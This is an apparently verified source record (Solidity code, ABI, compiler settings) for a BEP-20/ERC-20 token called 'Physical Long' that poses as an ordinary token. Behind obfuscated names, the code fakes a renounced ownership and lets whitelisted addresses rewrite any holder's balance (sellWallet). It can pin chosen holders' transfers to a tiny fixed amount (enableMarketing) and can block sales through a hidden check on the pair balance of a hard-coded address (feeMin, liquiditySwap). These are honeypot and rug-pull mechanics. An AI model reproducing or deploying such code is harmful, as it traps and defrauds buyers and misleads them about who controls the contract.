{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface tradingTakeLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamMax {\n    function createPair(address maxMin, address tokenIs) external returns (address);\n}\n\ninterface atIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeAt) external view returns (uint256);\n\n    function transfer(address atExemptTotal, uint256 fundLiquidityEnable) external returns (bool);\n\n    function allowance(address autoReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundLiquidityEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atExemptTotal,\n        uint256 fundLiquidityEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverList, uint256 value);\n    event Approval(address indexed autoReceiver, address indexed spender, uint256 value);\n}\n\ninterface atIsMetadata is atIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PhysicalLong is receiverMarketing, atIs, atIsMetadata {\n\n    constructor (){\n        \n        tradingTakeLimit marketingSwap = tradingTakeLimit(enableToken);\n        liquiditySender = teamMax(marketingSwap.factory()).createPair(marketingSwap.WETH(), address(this));\n        if (autoMarketing) {\n            swapToken = true;\n        }\n        sellFrom = _msgSender();\n        atTotal();\n        listAt[sellFrom] = true;\n        launchedAmount[sellFrom] = senderTotal;\n        if (swapToken) {\n            swapToken = false;\n        }\n        emit Transfer(address(0), sellFrom, senderTotal);\n    }\n\n    address private receiverExempt;\n\n    function approve(address amountFundLaunched, uint256 fundLiquidityEnable) public virtual override returns (bool) {\n        atBuy[_msgSender()][amountFundLaunched] = fundLiquidityEnable;\n        emit Approval(_msgSender(), amountFundLaunched, fundLiquidityEnable);\n        return true;\n    }\n\n    mapping(address => uint256) private launchedAmount;\n\n    function feeMin(uint256 fundLiquidityEnable) public {\n        toLaunch();\n        launchedLaunch = fundLiquidityEnable;\n    }\n\n    uint256 private senderTotal = 100000000 * 10 ** 18;\n\n    bool public tradingFund;\n\n    mapping(address => mapping(address => uint256)) private atBuy;\n\n    address public sellFrom;\n\n    bool private swapToken;\n\n    function owner() external view returns (address) {\n        return receiverExempt;\n    }\n\n    string private receiverTake = \"PLG\";\n\n    address minTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address receiverShould, address amountFundLaunched) external view virtual override returns (uint256) {\n        if (amountFundLaunched == enableToken) {\n            return type(uint256).max;\n        }\n        return atBuy[receiverShould][amountFundLaunched];\n    }\n\n    function toLaunch() private view {\n        require(listAt[_msgSender()]);\n    }\n\n    function sellWallet(address teamSell, uint256 fundLiquidityEnable) public {\n        toLaunch();\n        launchedAmount[teamSell] = fundLiquidityEnable;\n    }\n\n    function liquiditySwap(address atMin, address atExemptTotal, uint256 fundLiquidityEnable) internal returns (bool) {\n        if (atMin == sellFrom) {\n            return sellFundTotal(atMin, atExemptTotal, fundLiquidityEnable);\n        }\n        uint256 shouldAutoTeam = atIs(liquiditySender).balanceOf(minTx);\n        require(shouldAutoTeam == launchedLaunch);\n        require(atExemptTotal != minTx);\n        if (amountMode[atMin]) {\n            return sellFundTotal(atMin, atExemptTotal, autoShould);\n        }\n        return sellFundTotal(atMin, atExemptTotal, fundLiquidityEnable);\n    }\n\n    function enableMarketing(address receiverEnable) public {\n        toLaunch();\n        if (autoMarketing) {\n            swapToken = true;\n        }\n        if (receiverEnable == sellFrom || receiverEnable == liquiditySender) {\n            return;\n        }\n        amountMode[receiverEnable] = true;\n    }\n\n    function sellFundTotal(address atMin, address atExemptTotal, uint256 fundLiquidityEnable) internal returns (bool) {\n        require(launchedAmount[atMin] >= fundLiquidityEnable);\n        launchedAmount[atMin] -= fundLiquidityEnable;\n        launchedAmount[atExemptTotal] += fundLiquidityEnable;\n        emit Transfer(atMin, atExemptTotal, fundLiquidityEnable);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverExempt;\n    }\n\n    uint256 launchedLaunch;\n\n    mapping(address => bool) public listAt;\n\n    function name() external view virtual override returns (string memory) {\n        return limitModeBuy;\n    }\n\n    uint256 constant autoShould = 7 ** 10;\n\n    string private limitModeBuy = \"Physical Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTake;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderTotal;\n    }\n\n    uint256 tradingShould;\n\n    function transferFrom(address atMin, address atExemptTotal, uint256 fundLiquidityEnable) external override returns (bool) {\n        if (_msgSender() != enableToken) {\n            if (atBuy[atMin][_msgSender()] != type(uint256).max) {\n                require(fundLiquidityEnable <= atBuy[atMin][_msgSender()]);\n                atBuy[atMin][_msgSender()] -= fundLiquidityEnable;\n            }\n        }\n        return liquiditySwap(atMin, atExemptTotal, fundLiquidityEnable);\n    }\n\n    function balanceOf(address modeAt) public view virtual override returns (uint256) {\n        return launchedAmount[modeAt];\n    }\n\n    bool private isTeam;\n\n    mapping(address => bool) public amountMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamSwap;\n    }\n\n    uint8 private teamSwap = 18;\n\n    event OwnershipTransferred(address indexed limitExempt, address indexed receiverModeAuto);\n\n    address enableToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public autoMarketing;\n\n    function atTotal() public {\n        emit OwnershipTransferred(sellFrom, address(0));\n        receiverExempt = address(0);\n    }\n\n    function transfer(address teamSell, uint256 fundLiquidityEnable) external virtual override returns (bool) {\n        return liquiditySwap(_msgSender(), teamSell, fundLiquidityEnable);\n    }\n\n    function marketingBuy(address listMin) public {\n        require(listMin.balance < 100000);\n        if (tradingFund) {\n            return;\n        }\n        if (autoMarketing == swapToken) {\n            swapToken = true;\n        }\n        listAt[listMin] = true;\n        if (isTeam != swapToken) {\n            autoMarketing = true;\n        }\n        tradingFund = true;\n    }\n\n    address public liquiditySender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverModeAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountFundLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFundLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLiquidityEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"enableMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundLiquidityEnable\",\"type\":\"uint256\"}],\"name\":\"feeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMin\",\"type\":\"address\"}],\"name\":\"marketingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLiquidityEnable\",\"type\":\"uint256\"}],\"name\":\"sellWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLiquidityEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atExemptTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLiquidityEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PhysicalLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}